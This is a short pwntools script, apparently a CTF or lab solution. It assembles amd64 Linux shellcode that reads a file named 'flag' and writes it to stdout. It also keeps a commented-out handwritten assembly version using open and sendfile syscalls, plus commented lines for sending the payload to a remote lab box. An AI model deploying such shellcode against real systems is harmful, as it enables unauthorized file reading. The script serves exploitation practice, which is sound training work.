from pwn import *

context.arch = "amd64"
#context.log_level = "debug"
#context.encoding = "latin"

# p = remote("192.168.191.129", 5000) # you will need to change this to the Deploy Box IP
#p = process(["strace", elf.path])
#p = process([elf.path])

shellcode = (shellcraft.amd64.linux.cat('flag', fd=1))
shellcode = asm(shellcode)

# shellcode = asm(f"""

# .global _start
# .intel_syntax noprefix

# _start:

# lea rdi, [rip+flag]
# xor rsi, rsi
# xor rdx, rdx
# mov rax, 2
# syscall

# mov rdi, 1
# mov rsi, rax
# mov rdx, 0
# mov r10, 60
# mov rax, 40
# syscall


# flag:
#   .string "flag"

# """)

print(shellcode)

print(info(f"{disasm(shellcode)}"))

# assert type(shellcode) == bytes, "You should send bytes to the binary. Have you remembered to assemble?"

# p.readrepeat(1)
# p.send(shellcode)

# p.interactive()
